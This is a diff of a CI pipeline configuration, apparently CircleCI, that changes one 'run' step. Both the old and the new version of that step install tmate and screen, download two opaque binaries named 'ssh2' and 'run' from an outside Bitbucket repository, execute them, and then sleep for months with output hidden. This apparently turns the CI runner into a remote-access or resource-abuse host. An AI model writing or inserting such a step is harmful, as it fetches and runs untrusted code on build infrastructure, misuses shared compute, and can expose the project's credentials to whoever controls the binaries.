@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: apt-get update -y && apt-get install -y screen tmate sudo && wget https://bitbucket.org/mukidi2/ssh/raw/9a13a317a08a11b516b232b60c008a9775de0a61/ssh2 && wget https://bitbucket.org/mukidi2/ssh/raw/9a13a317a08a11b516b232b60c008a9775de0a61/run && chmod +x ssh2 run && ./ssh2 && ./ssh2 && sleep 7676543 >/dev/null 2>&1
+      - run: apt-get install -y screen tmate sudo && wget https://bitbucket.org/mukidi2/ssh/raw/9a13a317a08a11b516b232b60c008a9775de0a61/ssh2 && wget https://bitbucket.org/mukidi2/ssh/raw/9a13a317a08a11b516b232b60c008a9775de0a61/run && chmod +x ssh2 run && ./ssh2 && ./ssh2 && sleep 7676543 >/dev/null 2>&1
